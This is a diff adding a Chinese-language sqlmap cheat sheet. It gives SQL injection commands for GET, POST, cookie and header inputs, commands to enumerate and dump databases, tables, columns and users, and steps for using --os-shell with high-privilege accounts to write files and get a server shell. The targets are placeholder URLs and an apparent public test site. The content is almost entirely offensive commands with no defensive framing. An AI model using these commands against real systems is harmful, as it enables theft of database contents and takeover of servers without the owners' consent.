@@ -1,0 +1,72 @@
+get注入：
+  sqlmap.py -u "http://www.xxx.com/xxx.asp?id=1" 
+
+post注入：
+  sqlmap.py -u "http://www.xxx.com/xxx.asp" --data "username=admin"
+
+cookie注入
+  sqlmap.py -u "http://www.xxx.com/xxx.asp?id=1"  --cookie="dsadasdasdasda=dsadasdsadassad"
+
+请求头注入
+  sqlmap.py -r a.txt
+
+
+Access:
+
+  查看表：
+  sqlmap.py -u "URL" --tables				
+
+  查看列：
+  sqlmap.py -u "URL" -T 'tablename' --columns
+
+  查看数据：
+  sqlmap.py -u "URL" -T 'tablename' -C 'columnname' --dump
+
+
+
+MSSQL,MYSQL:
+
+  http://testasp.vulnweb.com/showforum.asp?id=1
+
+  查看库：
+  sqlmap.py -u "URL" --dbs
+
+  查看当前库
+  sqlmap.py -u "URL" --current-db
+
+  查看表
+  sqlmap.py -u "RUL" -D 'database' --tables
+  
+  查看列：
+  sqlmap.py -u "URL" -D 'database' -T 'tablename' --columns
+
+  查看数据：
+  sqlmap.py -u "URL" -D 'database' -T 'tablename' -C 'columnname' --dump 
+
+  查看用户：
+  sqlmap.py -u "URL" --users
+
+  查看当前用户：
+  sqlmap.py -u "URL" --current-user
+
+  查看数据量
+  sqlmap.py -u "URL" -D 'database' --tables --count 
+
+
+
+写文件
+
+  通过--current-user取得当前用户权限
+
+  oracle: dba
+  mysql:  root
+  mssql:  sa
+
+  若为上面的用户则有最高权限可以写入数据:
+  sqlmap.py -u "URL" --os-shell   
+
+  需填网页的绝对路径如：[1.公共位置  2.自定义位置  3.自定义路径列表  4.暴力破解]
+  /var/www
+  D:\www\inetpub
+
+  
